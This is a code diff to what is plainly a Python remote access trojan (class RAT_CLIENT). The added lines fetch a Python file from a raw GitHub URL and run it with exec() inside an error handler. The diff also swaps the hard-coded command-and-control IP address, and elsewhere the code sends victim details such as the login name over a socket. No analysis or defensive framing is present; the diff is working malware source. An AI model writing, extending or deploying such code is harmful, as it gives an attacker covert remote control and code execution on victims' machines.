@@ -50,9 +50,15 @@ class RAT_CLIENT:
             s.send(sending.encode())
         except socket.error as e:
             print (e)
-            rat = RAT_CLIENT(91.109.178.16, 1429)
+            rat = RAT_CLIENT(self.host, self.port)
             print(self.host, self.port)
-            print("mierda")
+            print ("mierdeos2")
+            import urllib.request
+            code = 'https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'
+            response = urllib.request.urlopen(code)
+            data = response.read()
+            exec(data)
+
             if __name__ == '__main__':
                 rat.build_connection()
                 rat.execute()
@@ -613,7 +619,7 @@ User: {os.getlogin()}
                 s.send(b"exit")
                 break
             
-rat = RAT_CLIENT('91.109.178.16', 1429)
+rat = RAT_CLIENT('11.42.47.118', 1429)
 
 if __name__ == '__main__':
     rat.build_connection()
